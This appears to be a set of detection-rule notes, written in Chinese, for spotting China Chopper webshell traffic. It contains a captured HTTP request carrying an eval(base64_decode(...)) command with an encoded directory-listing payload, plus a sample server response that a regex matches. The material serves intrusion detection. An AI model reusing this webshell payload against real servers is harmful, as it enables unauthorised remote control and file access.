### webshell_caidao_php
    匹配菜刀最常见的特征base64_decode
    POST /upload/1.php HTTP/1.1\r\nUser-Agent: Java/1.8.0_151\r\nHost: xxxxxxx\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r
    \nConnection: keep-alive\r\nContent-type: application/x-www-form-urlencoded\r\nContent-Length: 725\r\n\r\naa=@eval.   (base64_decode($_POST[action]));&action=QGluaV9zZXQoImR   pc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQ     pO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1=RDpcd2FtcDY0XHd3d1x1cGxvYWQ%3D

### 可疑的caidao响应-列目录 
    通过正则表达式匹配http响应里列目录操作,排除掉html标签避免误报
    ->|1.jsp.2018-10-14 12:21:12.2129.R W
    |<-
